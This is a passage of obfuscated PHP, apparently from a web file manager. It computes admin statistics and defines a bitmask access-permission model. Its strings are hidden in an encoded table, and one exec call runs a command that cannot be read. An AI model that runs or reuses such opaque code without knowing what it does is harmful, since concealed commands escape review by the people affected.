$£æÒ·Ú˜ = array($’Ç¼¯â‰[679] => array($’Ç¼¯â‰[850] => LNG($’Ç¼¯â‰[1931]), $’Ç¼¯â‰[1915] => LNG($’Ç¼¯â‰[1932]), $’Ç¼¯â‰[1916] => LNG($’Ç¼¯â‰[1933])), $’Ç¼¯â‰[1917] => array($’Ç¼¯â‰[848] => LNG($’Ç¼¯â‰[1934]), $’Ç¼¯â‰[1919] => LNG($’Ç¼¯â‰[1935]), $’Ç¼¯â‰[1920] => LNG($’Ç¼¯â‰[1936]), $’Ç¼¯â‰[1921] => LNG($’Ç¼¯â‰[1937]))); $ÃáíÒÀ€ = array($’Ç¼¯â‰[679] => $’Ç¼¯â‰[1938], $’Ç¼¯â‰[1917] => $’Ç¼¯â‰[79]); if (empty($¤™ùŒŞ´)) { $â„£§ = date($’Ç¼¯â‰[1922], strtotime($’Ç¼¯â‰[1923])); $Ò“…ñ¥á = array($’Ç¼¯â‰[285] => $â„£§); foreach ($£æÒ·Ú˜[$ÓŞŒôöŸ] as $÷ˆšçŸ => $ºÛ®€¿·) { $Ò“…ñ¥á[$÷ˆšçŸ] = 0; } $¤™ùŒŞ´[] = $Ò“…ñ¥á; } $ØÕÒÖ½• = array(); foreach ($¤™ùŒŞ´ as $ºÛ®€¿·) { if ($ÓŞŒôöŸ == $’Ç¼¯â‰[1917] && $ºÛ®€¿·[$’Ç¼¯â‰[1919]] > $ºÛ®€¿·[$’Ç¼¯â‰[848]]) { $ºÛ®€¿·[$’Ç¼¯â‰[1919]] = $ºÛ®€¿·[$’Ç¼¯â‰[848]]; } foreach ($£æÒ·Ú˜[$ÓŞŒôöŸ] as $÷ˆšçŸ => $àÏıÍÇ½) { $§ç£Òò¨ = array($’Ç¼¯â‰[285] => $ºÛ®€¿·[$’Ç¼¯â‰[285]], $’Ç¼¯â‰[1673] => $àÏıÍÇ½); $§ç£Òò¨[$ÃáíÒÀ€[$ÓŞŒôöŸ]] = isset($ºÛ®€¿·[$÷ˆšçŸ]) ? $ºÛ®€¿·[$÷ˆšçŸ] : 0; $ØÕÒÖ½•[] = $§ç£Òò¨; } } return $ØÕÒÖ½•; } public function validDate($şıËÔÒ…, $¯çñıö) { $ü ¦£É =& $_SERVER[ˆö¿ÚÌ¼]; $€ÎùñŠÛ = date($ü ¦£É[1922], strtotime($ü ¦£É[1923])); $–ÛÚıÊ = array($€ÎùñŠÛ); switch ($şıËÔÒ…) { case $ü ¦£É[1764]: $¯‡­´¹ = mktime(0, 0, 0, date($ü ¦£É[1939]), date($ü ¦£É[1466]) - date($ü ¦£É[1555]) + 7 - 7, date($ü ¦£É[1940])); $Ôœ©ìşÙ = 0; do { $ñŸ€†³Ù = date($ü ¦£É[1922], $¯‡­´¹ - 3600 * 24 * 7 * $Ôœ©ìşÙ); $–ÛÚıÊ[] = $ñŸ€†³Ù; $Ôœ©ìşÙ++; } while ($¯çñıö < $ñŸ€†³Ù); break; case $ü ¦£É[1762]: $Ôœ©ìşÙ = 1; do { $¥î¨±Ò» = date($ü ¦£É[1941], strtotime("\55\x20{$Ôœ©ìşÙ}\x20\x6d\157\156\164\x68\x73")); $–ÛÚıÊ[] = $¥î¨±Ò»; $Ôœ©ìşÙ++; } while ($¯çñıö < $¥î¨±Ò»); break; case $ü ¦£É[1942]: $®ÓÚÑÀ = (int) date($ü ¦£É[1940], strtotime($¯çñıö)); $€Ÿ°§Ğ = (int) date($ü ¦£É[1940]); if ($®ÓÚÑÀ >= $€Ÿ°§Ğ) { break; } for ($®ÓÚÑÀ; $®ÓÚÑÀ < $€Ÿ°§Ğ; $®ÓÚÑÀ++) { $–ÛÚıÊ[] = $®ÓÚÑÀ . $ü ¦£É[1943]; } break; default: break; } if ($¯çñıö > end($–ÛÚıÊ)) { array_pop($–ÛÚıÊ); } sort($–ÛÚıÊ); return $–ÛÚıÊ; } public function listTable($ÚşŠŠÚè) { $ƒÀ×«¦± = ucfirst($ÚşŠŠÚè); return Model($ƒÀ×«¦±)->listData(); } public function option($±ú»ÇŠ¶) { $³é£‹Ü‚ = $_SERVER[ˆö¿ÚÌ¼][1944] . ucfirst($±ú»ÇŠ¶); return $this->{$³é£‹Ü‚}(); } private function optionUser() { $ûÌŒè«Ü =& $_SERVER[ˆö¿ÚÌ¼]; $àÆªªş = Model($ûÌŒè«Ü[611])->count($ûÌŒè«Ü[1785]); $Å’Ò‹ë— = Model($ûÌŒè«Ü[611])->where($ûÌŒè«Ü[1945])->count($ûÌŒè«Ü[1785]); $İ®ÙÓ™û = intval($GLOBALS[$ûÌŒè«Ü[6]][$ûÌŒè«Ü[427]][$ûÌŒè«Ü[1730]]) / 3600; $é›ò¬¾´ = strtotime("\55{$İ®ÙÓ™û}\x20\150\157\165\x72\x73"); $ÉÃœÓ„ = strtotime(date($ûÌŒè«Ü[1926])); if ($é›ò¬¾´ < $ÉÃœÓ„) { $é›ò¬¾´ = $ÉÃœÓ„; } $Üâ–„Úı = array($ûÌŒè«Ü[1946] => array($ûÌŒè«Ü[1105], $é›ò¬¾´)); $úÌ¥—ı† = (int) Model($ûÌŒè«Ü[611])->where($Üâ–„Úı)->count($ûÌŒè«Ü[1785]); if (!$úÌ¥—ı†) { $úÌ¥—ı† = 1; } $Üâ–„Úı = array($ûÌŒè«Ü[1946] => array($ûÌŒè«Ü[1105], $ÉÃœÓ„)); $è™°Ö = Model($ûÌŒè«Ü[611])->where($Üâ–„Úı)->count($ûÌŒè«Ü[1785]); return array($ûÌŒè«Ü[843] => (int) $àÆªªş, $ûÌŒè«Ü[1947] => (int) ($àÆªªş - $Å’Ò‹ë—), $ûÌŒè«Ü[1948] => (int) $Å’Ò‹ë—, $ûÌŒè«Ü[1949] => (int) $è™°Ö, $ûÌŒè«Ü[1950] => $úÌ¥—ı†); } private function optionFile() { $È’¿ªÜ =& $_SERVER[ˆö¿ÚÌ¼]; $úˆ™¶ÉÖ = $this->sourceSize(); $ÔŒ—¬€Ö = $úˆ™¶ÉÖ[$È’¿ªÜ[79]]; $Ó„¸¸¯Û = $úˆ™¶ÉÖ[$È’¿ªÜ[1919]]; $£‘¼¹È÷ = Model($È’¿ªÜ[915])->where(array($È’¿ªÜ[497] => 0))->count($È’¿ªÜ[194]); $û—ˆ´á× = array($È’¿ªÜ[497] => 0, $È’¿ªÜ[234] => array($È’¿ªÜ[1105], strtotime(date($È’¿ªÜ[1926])))); $ğÕÉ¤ÚÅ = Model($È’¿ªÜ[915])->where($û—ˆ´á×)->sum($È’¿ªÜ[79]); $ß³·œó¶ = Model($È’¿ªÜ[915])->where($û—ˆ´á×)->count($È’¿ªÜ[194]); return array($È’¿ªÜ[848] => $ÔŒ—¬€Ö, $È’¿ªÜ[1919] => $Ó„¸¸¯Û, $È’¿ªÜ[1951] => $ÔŒ—¬€Ö - $Ó„¸¸¯Û, $È’¿ªÜ[1952] => (int) $ğÕÉ¤ÚÅ, $È’¿ªÜ[850] => (int) $£‘¼¹È÷, $È’¿ªÜ[1953] => (int) $ß³·œó¶); } private function optionAccess() { $ö«ÓàŸ™ =& $_SERVER[ˆö¿ÚÌ¼]; return array($ö«ÓàŸ™[843] => $this->typeLogCnt(), $ö«ÓàŸ™[110] => $this->typeLogCnt($ö«ÓàŸ™[110]), $ö«ÓàŸ™[537] => $this->typeLogCnt($ö«ÓàŸ™[537]), $ö«ÓàŸ™[1954] => $this->typeLogCnt($ö«ÓàŸ™[1954]), $ö«ÓàŸ™[1955] => $this->typeLogCnt($ö«ÓàŸ™[1955]), $ö«ÓàŸ™[679] => $this->typeLogCnt($ö«ÓàŸ™[12], $ö«ÓàŸ™[1930])); } private function typeLogCnt($Çøíáî = '', $ã¦¶İ¬Î = "\x69\144") { $ñ¬æ÷™  =& $_SERVER[ˆö¿ÚÌ¼]; $¹é¨¸ã = array($ñ¬æ÷™ [110] => array($ñ¬æ÷™ [1956], $ñ¬æ÷™ [1957]), $ñ¬æ÷™ [537] => array($ñ¬æ÷™ [1958], $ñ¬æ÷™ [1959]), $ñ¬æ÷™ [1954] => array($ñ¬æ÷™ [1960], $ñ¬æ÷™ [1961], $ñ¬æ÷™ [1962]), $ñ¬æ÷™ [1955] => array($ñ¬æ÷™ [1963], $ñ¬æ÷™ [1964]), $ñ¬æ÷™ [1965] => array($ñ¬æ÷™ [1966], $ñ¬æ÷™ [1967], $ñ¬æ÷™ [1968])); $ÙâõÖ–° = strtotime(date($ñ¬æ÷™ [1926])); $ÒÕ„ô¢Ë = array($ñ¬æ÷™ [234] => array($ñ¬æ÷™ [1105], $ÙâõÖ–°)); if ($Çøíáî) { $ÒÕ„ô¢Ë[$ñ¬æ÷™ [33]] = array($ñ¬æ÷™ [7], $¹é¨¸ã[$Çøíáî]); } $œ–„£Ç = Model($ñ¬æ÷™ [1929])->where($ÒÕ„ô¢Ë)->count($ã¦¶İ¬Î); return (int) $œ–„£Ç; } private function optionServer() { $ˆ›ÆÛ¯Æ =& $_SERVER[ˆö¿ÚÌ¼]; $ƒ¸¸Ş¾˜ = $this->diskDriver(); $°³©öã = KodIO::defaultDriver(); $¬§ÅÈÇ = array($ˆ›ÆÛ¯Æ[908] => $°³©öã[$ˆ›ÆÛ¯Æ[478]]); $‡®¦´ € = Model($ˆ›ÆÛ¯Æ[558])->where($¬§ÅÈÇ)->sum($ˆ›ÆÛ¯Æ[79]); $Úú¤—ìº = explode($ˆ›ÆÛ¯Æ[53], $_SERVER[$ˆ›ÆÛ¯Æ[147]]); $×‹ã½ƒÉ = $Úú¤—ìº[0]; $ÏÆÊŒ¶¨ = $GLOBALS[$ˆ›ÆÛ¯Æ[6]][$ˆ›ÆÛ¯Æ[21]]; $Íã¿˜ô = $ÏÆÊŒ¶¨[$ˆ›ÆÛ¯Æ[1067]]; if ($Íã¿˜ô == $ˆ›ÆÛ¯Æ[1055]) { $À‚ªà– = explode($ˆ›ÆÛ¯Æ[1382], $ÏÆÊŒ¶¨[$ˆ›ÆÛ¯Æ[1066]]); $Íã¿˜ô = $À‚ªà–[0]; } if ($Íã¿˜ô == $ˆ›ÆÛ¯Æ[1003] || $Íã¿˜ô == $ˆ›ÆÛ¯Æ[893]) { $¹çŸôŠ¼ = Model()->db()->query($ˆ›ÆÛ¯Æ[1969]); $‹§ñ˜È÷ = $¹çŸôŠ¼[0] && isset($¹çŸôŠ¼[0][$ˆ›ÆÛ¯Æ[1672]]) ? $¹çŸôŠ¼[0][$ˆ›ÆÛ¯Æ[1672]] : 0; $Íã¿˜ô = $ˆ›ÆÛ¯Æ[1970] . ($‹§ñ˜È÷ ? $ˆ›ÆÛ¯Æ[8] . $‹§ñ˜È÷ : $ˆ›ÆÛ¯Æ[12]); } $şÁÎ™›ä = $GLOBALS[$ˆ›ÆÛ¯Æ[6]][$ˆ›ÆÛ¯Æ[427]][$ˆ›ÆÛ¯Æ[917]]; return array($ˆ›ÆÛ¯Æ[1971] => $ƒ¸¸Ş¾˜ ? $ƒ¸¸Ş¾˜[$ˆ›ÆÛ¯Æ[1972]] : 0, $ˆ›ÆÛ¯Æ[1973] => $ƒ¸¸Ş¾˜ ? $ƒ¸¸Ş¾˜[$ˆ›ÆÛ¯Æ[1974]] : 0, $ˆ›ÆÛ¯Æ[1975] => (int) $°³©öã[$ˆ›ÆÛ¯Æ[1972]] * 1024 * 1024 * 1024, $ˆ›ÆÛ¯Æ[1976] => (int) $‡®¦´ €, $ˆ›ÆÛ¯Æ[1977] => ucfirst($×‹ã½ƒÉ), $ˆ›ÆÛ¯Æ[1978] => $ˆ›ÆÛ¯Æ[1979] . PHP_VERSION, $ˆ›ÆÛ¯Æ[1980] => phpBuild64() ? 64 : 32, $ˆ›ÆÛ¯Æ[842] => str_replace($ˆ›ÆÛ¯Æ[1223], $ˆ›ÆÛ¯Æ[1083], $Íã¿˜ô), $ˆ›ÆÛ¯Æ[427] => ucfirst($şÁÎ™›ä), $ˆ›ÆÛ¯Æ[32] => $_SERVER[$ˆ›ÆÛ¯Æ[1981]]); } private function diskDriver() { $šÅ¡¯¶® =& $_SERVER[ˆö¿ÚÌ¼]; $ã ç´ìõ = $šÅ¡¯¶®[8]; $Âšß©¸º = $GLOBALS[$šÅ¡¯¶®[6]][$šÅ¡¯¶®[1399]] == $šÅ¡¯¶®[1400]; if ($Âšß©¸º) { $ã ç´ìõ = $šÅ¡¯¶®[1982]; if (function_exists($šÅ¡¯¶®[1983])) { exec($šÅ¡¯¶®[1984], $”ÁÈë¡¹); $ã ç´ìõ = $”ÁÈë¡¹[1] . $šÅ¡¯¶®[8]; } } if (!file_exists($ã ç´ìõ)) { return; } if (!function_exists($šÅ¡¯¶®[1985])) { return; } $æŸÅ·× = @disk_total_space($ã ç´ìõ); $Á“ö€ş£ = $æŸÅ·× - @disk_free_space($ã ç´ìõ); return array($šÅ¡¯¶®[1972] => $æŸÅ·×, $šÅ¡¯¶®[1974] => $Á“ö€ş£); } public function fileChart($¯ø©ÌÎŸ) { $ÀùŠ¶æ =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($¯ø©ÌÎŸ[$ÀùŠ¶æ[1785]])) { return Model($ÀùŠ¶æ[915])->userFileTypeProfile($¯ø©ÌÎŸ[$ÀùŠ¶æ[1785]]); } if (isset($¯ø©ÌÎŸ[$ÀùŠ¶æ[1986]])) { return Model($ÀùŠ¶æ[915])->groupFileTypeProfile($¯ø©ÌÎŸ[$ÀùŠ¶æ[1986]]); } $•Ú°ÛŞÜ = $this->sourceSize(); $¹ñŞÆƒÖ = array($ÀùŠ¶æ[193] => 0, $ÀùŠ¶æ[191] => 1); $ß£•Ö‹Á = Model($ÀùŠ¶æ[915])->where($¹ñŞÆƒÖ)->sum($ÀùŠ¶æ[79]); $¹ñŞÆƒÖ[$ÀùŠ¶æ[191]] = 2; $Ë·ÇïÂÁ = Model($ÀùŠ¶æ[915])->where($¹ñŞÆƒÖ)->sum($ÀùŠ¶æ[79]); return array($ÀùŠ¶æ[848] => $•Ú°ÛŞÜ[$ÀùŠ¶æ[79]], $ÀùŠ¶æ[1919] => $•Ú°ÛŞÜ[$ÀùŠ¶æ[1919]], $ÀùŠ¶æ[1920] => (int) $ß£•Ö‹Á, $ÀùŠ¶æ[1921] => (int) $Ë·ÇïÂÁ); } private function sourceSize() { $›¹–¢×£ =& $_SERVER[ˆö¿ÚÌ¼]; $óÂùØü´ = Model($›¹–¢×£[915])->where(array($›¹–¢×£[497] => 0))->sum($›¹–¢×£[79]); $¯ƒ˜¶Ä = Model($›¹–¢×£[558])->sum($›¹–¢×£[79]); if ($¯ƒ˜¶Ä > $óÂùØü´) { $¯ƒ˜¶Ä = $óÂùØü´; } return array($›¹–¢×£[79] => (int) $óÂùØü´, $›¹–¢×£[1919] => (int) $¯ƒ˜¶Ä); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ëœ›÷ŞÙ =& $_SERVER[ˆö¿ÚÌ¼]; $êØ˜®ÖÌ = array(array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[1987]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[1989], $Ëœ›÷ŞÙ[1990] => 1, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[1993]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[1994], $Ëœ›÷ŞÙ[1990] => 2, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[1995]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[1996], $Ëœ›÷ŞÙ[1990] => 3, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[1997]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[1998], $Ëœ›÷ŞÙ[1990] => 4, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[1999]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[2000], $Ëœ›÷ŞÙ[1990] => 5, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[2001]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[2002], $Ëœ›÷ŞÙ[1990] => 6, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ëœ›÷ŞÙ[506] => LNG($Ëœ›÷ŞÙ[2003]), $Ëœ›÷ŞÙ[1988] => $Ëœ›÷ŞÙ[2004], $Ëœ›÷ŞÙ[1990] => 7, $Ëœ›÷ŞÙ[1991] => 1, $Ëœ›÷ŞÙ[1992] => 0)); return $êØ˜®ÖÌ; } public static function authCheck($òõÜÂ‡©, $şş„Êê¯) { $ÖÍÄÖŒõ =& $_SERVER[ˆö¿ÚÌ¼]; $òõÜÂ‡© = intval($òõÜÂ‡©); if (KodUser::isRoot() && $GLOBALS[$ÖÍÄÖŒõ[6]][$ÖÍÄÖŒõ[2005]]) { return !0; } if ($òõÜÂ‡© <= 0) { return !1; } if (($òõÜÂ‡© & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($òõÜÂ‡© & $şş„Êê¯); } public static function authCheckShow($ıÈäËêœ) { return self::authCheck($ıÈäËêœ, self::AUTH_SHOW); } public static function authCheckView($¤òõÎËÊ) { return self::authCheck($¤òõÎËÊ, self::AUTH_VIEW); } public static function authCheckDownload($ğ‹³çûñ) { return self::authCheck($ğ‹³çûñ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($òŒ¢Í‘) { return self::authCheck($òŒ¢Í‘, self::AUTH_UPLOAD); } public static function authCheckEdit($Ì¾ŸÛµş) { return self::authCheck($Ì¾ŸÛµş, self::AUTH_EDIT); } public static function authCheckRemove($ÃÍ‚Æ®) { return self::authCheck($ÃÍ‚Æ®, self::AUTH_REMOVE); } public static function authCheckShare($“áè¨ùÉ) { return self::authCheck($“áè¨ùÉ, self::AUTH_SHARE); } public static function authCheckComment($‚­•‰å²) { return self::authCheck($‚­•‰å², self::AUTH_COMMENT); } public static function authCheckEvent($îÉºô­•) { return self::authCheck($îÉºô­•, self::AUTH_EVENT); } public static function authCheckRoot($–…æı”°) { return self::authCheck($–…æı”°, self::AUTH_ROOT); } public static function authCheckAction($×¬Îî‹Â, $ŸŸÊú£Ò) { $Ñ²’œğÁ =& $_SERVER[ˆö¿ÚÌ¼]; $šŞ¤›¿­ = array($Ñ²’œğÁ[2006] => self::AUTH_VIEW, $Ñ²’œğÁ[1293] => self::AUTH_DOWNLOAD, $Ñ²’œğÁ[110] => self::AUTH_UPLOAD, $Ñ²’œğÁ[1955] => self::AUTH_EDIT, $Ñ²’œğÁ[1954] => self::AUTH_REMOVE, $Ñ²’œğÁ[1965] => self::AUTH_SHARE, $Ñ²’œğÁ[432] => self::AUTH_COMMENT, $Ñ²’œğÁ[1772] => self::AUTH_EVENT, $Ñ²’œğÁ[2007] => self::AUTH_ROOT); if (!isset($šŞ¤›¿­[$ŸŸÊú£Ò])) { return; } $ÍäÉˆùÀ = $šŞ¤›¿­[$ŸŸÊú£Ò]; $×¬Îî‹Â = intval($×¬Îî‹Â); if ($×¬Îî‹Â <= 0) { return !1; } if (($×¬Îî‹Â & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($×¬Îî‹Â & $ÍäÉˆùÀ); } public static function authDisable($ôÌ˜ÅÀ, $ÎÕóëÀ) { if (intval($ôÌ˜ÅÀ) <= 0) { return 0; } return intval($ôÌ˜ÅÀ) & ~$ÎÕóëÀ; } public $optionType = "\x53\x79\163\164\145\155\56\x73\157\165\162\x63\x65\101\165\x74\150\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\x74\x68", "\154\x61\x62\145\154", "\144\151\x73\x70\154\141\x79", "\163\171\x73\x74\x65\x6d", "\163\x6f\162\x74"); public function initData() { $©¤²±˜„ = $this->authDefault(); foreach ($©¤²±˜„ as $Ü®“Øã) { $this->add($Ü®“Øã); } } public function findAuth($¶¸‰‰³š, $Â²Ñğû¸) { $âŸ¦í¤ =& $_SERVER[ˆö¿ÚÌ¼]; $á©üûŸ§ = parent::listData(); foreach ($á©üûŸ§ as $±Í¿Ä¦˜) { $œÖã·‰° = intval($±Í¿Ä¦˜[$âŸ¦í¤[499]]); if ($œÖã·‰° <= 0 || $±Í¿Ä¦˜[$âŸ¦í¤[2008]] == 0) { continue; } if (($œÖã·‰° & $¶¸‰‰³š) != $¶¸‰‰³š) { continue; } if (($œÖã·‰° & $Â²Ñğû¸) != 0) { continue; } return $±Í¿Ä¦˜[$âŸ¦í¤[478]]; } return !1; } public function findAuthMax($‡ú¸Ôù¸, $«¹íú¼¨) { $Ú¹Ñ”¾Ï =& $_SERVER[ˆö¿ÚÌ¼]; $£†—èı· = !1; $½ò›µº = parent::listData(); foreach ($½ò›µº as $ÛÉåˆ) { $„¢É˜çÓ = intval($ÛÉåˆ[$Ú¹Ñ”¾Ï[499]]); if ($„¢É˜çÓ <= 0 || $ÛÉåˆ[$Ú¹Ñ”¾Ï[2008]] == 0) { continue; } if (($„¢É˜çÓ & $‡ú¸Ôù¸) != $‡ú¸Ôù¸) { continue; } if (($„¢É˜çÓ & $«¹íú¼¨) != 0) { continue; } if (!$£†—èı·) { $£†—èı· = $ÛÉåˆ; continue; } if (intval($£†—èı·[$Ú¹Ñ”¾Ï[499]]) < $„¢É˜çÓ) { $£†—èı· = $ÛÉåˆ; } } return $£†—èı· ? $£†—èı·[$Ú¹Ñ”¾Ï[478]] : !1; } public function findAuthReadOnly() { $®«Ö¿¡Ô = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $üšˆ¡Æø = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($®«Ö¿¡Ô, $üšˆ¡Æø); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $€–Ì°—© =& $_SERVER[ˆö¿ÚÌ¼]; $·Ğã•è = parent::listData(); $×¥‹ÀÅ¤ = !1; foreach ($·Ğã•è as $Ãüñ¸ãë) { if ($Ãüñ¸ãë[$€–Ì°—©[499]] <= 0 || $Ãüñ¸ãë[$€–Ì°—©[2008]] == $€–Ì°—©[231]) { continue; } if (!$×¥‹ÀÅ¤) { $×¥‹ÀÅ¤ = $Ãüñ¸ãë; continue; } if ($×¥‹ÀÅ¤[$€–Ì°—©[499]] > $Ãüñ¸ãë[$€–Ì°—©[499]]) { $×¥‹ÀÅ¤ = $Ãüñ¸ãë; } } return $×¥‹ÀÅ¤ ? $×¥‹ÀÅ¤[$€–Ì°—©[478]] : $€–Ì°—©[12]; } public function listData($Á®Á¥¬… = false, $ÀËô³îş = "\x73\157\x72\164", $Íİ‰ÃãØ = false) { return parent::listData($Á®Á¥¬…, $ÀËô³îş, $Íİ‰ÃãØ); } public function update($ÍÌò××, $Íé·õ‚á) { $“…îÃ”Î =& $_SERVER[ˆö¿ÚÌ¼]; $À¸ÕĞÏÜ = parent::listData($ÍÌò××); $õˆ’È… = $this->findByName($Íé·õ‚á[$“…îÃ”Î[32]]); if (!$À¸ÕĞÏÜ || $õˆ’È… && $õˆ’È…[$“…îÃ”Î[478]] != $À¸ÕĞÏÜ[$“…îÃ”Î[478]]) { return !1; } $this->filterAuth($Íé·õ‚á[$“…îÃ”Î[499]]); return parent::update($ÍÌò××, $Íé·õ‚á); } public function remove($‡ˆúù¥£) { $‰ÂîÊÂ¹ = parent::listData($‡ˆúù¥£); if (!$‰ÂîÊÂ¹ || $‰ÂîÊÂ¹[$_SERVER[ˆö¿ÚÌ¼][192]]) { return !1; } return parent::remove($‡ˆúù¥£); } public function add($Å¯¼£ Õ = array()) { $§¨©•¿ı =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->findByName($Å¯¼£ Õ[$§¨©•¿ı[32]])) { return !1; } $µÂ ûû¹ = array($§¨©•¿ı[32] => $§¨©•¿ı[12], $§¨©•¿ı[499] => 1, $§¨©•¿ı[2009] => $§¨©•¿ı[1996], $§¨©•¿ı[2008] => 1, $§¨©•¿ı[192] => 0, $§¨©•¿ı[2010] => 0); $Å¯¼£ Õ = array_merge($µÂ ûû¹, $Å¯¼£ Õ); $Å¯¼£ Õ[$§¨©•¿ı[2010]] = $this->getSort(); $this->filterAuth($Å¯¼£ Õ[$§¨©•¿ı[499]]); return parent::insert($Å¯¼£ Õ); } private function getSort() { $Õå½Å•ğ =& $_SERVER[ˆö¿ÚÌ¼]; $’‰óñÍ = parent::listData(); $¥‡‡‚úç = array_to_keyvalue($’‰óñÍ, $Õå½Å•ğ[12], $Õå½Å•ğ[2010]); return empty($¥‡‡‚úç) ? 0 : max($¥‡‡‚úç) + 1; } private function filterAuth(&$‰¨ÂùŞ´) { if (!$‰¨ÂùŞ´) { return; } $²’´Í¦€ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $³·¬±Õ‘ = array(); foreach ($²’´Í¦€ as $¦ÅÖè“á) { if ($‰¨ÂùŞ´ & $¦ÅÖè“á) { $³·¬±Õ‘[] = $¦ÅÖè“á; } } if (in_array(self::AUTH_ROOT, $³·¬±Õ‘)) { $‰¨ÂùŞ´ = array_sum($²’´Í¦€); return; } $Ûîâ‘–å = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($³·¬±Õ‘ as $¦ÅÖè“á) { if (isset($Ûîâ‘–å[$¦ÅÖè“á])) { $³·¬±Õ‘ = array_merge($³·¬±Õ‘, $Ûîâ‘–å[$¦ÅÖè“á]); } } $³·¬±Õ‘[] = self::AUTH_SHOW; $‰¨ÂùŞ´ = array_sum(array_unique($³·¬±Õ‘)); } public function sort($½°ı‰£, $á¿‰Î‰³) { return parent::update($½°ı‰£, $á¿‰Î‰³); } } goto B–Ò‘·îÆ; F³Äí…ö¾Ñ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\x6d\x4f\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($şÁ¶úß© = false, $³»€Ğ±ê = "\x6d\x6f\x64\151\x66\171\124\x69\155\x65", $ç¤ÆÌ¹İ = false) { $üôúªÕ— = Model($this->modelType)->get(!1, $this->optionType, !0); $Úó‹‘á½ = array_values($üôúªÕ—); if ($Úó‹‘á½ && $Úó‹‘á½[0] && !is_array($Úó‹‘á½[0])) { Model($this->modelType)->cacheRemove($this->optionType); $üôúªÕ— = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$üôúªÕ—) { return $şÁ¶úß© ? null : array(); } if (!$şÁ¶úß©) { $üôúªÕ— = array_filter(array_values($üôúªÕ—)); return array_sort_by($üôúªÕ—, $³»€Ğ±ê, $ç¤ÆÌ¹İ); } return $üôúªÕ—[$_SERVER[ˆö¿ÚÌ¼][475] . $şÁ¶úß©]; } public function insert($¼óªƒ¢¼) { $€¦£™¨ =& $_SERVER[ˆö¿ÚÌ¼]; $¼óªƒ¢¼ = array_field_key($¼óªƒ¢¼, $this->field); $ÚãÂÜûŞ = Model($this->modelType)->get($€¦£™¨[476], $this->optionType . $€¦£™¨[477]); $ÚãÂÜûŞ = $ÚãÂÜûŞ ? $ÚãÂÜûŞ : 0; $¼óªƒ¢¼[$€¦£™¨[478]] = ++$ÚãÂÜûŞ; $¼óªƒ¢¼[$€¦£™¨[234]] = time(); $¼óªƒ¢¼[$€¦£™¨[88]] = time(); Model($this->modelType)->set($€¦£™¨[476], $ÚãÂÜûŞ, $this->optionType . 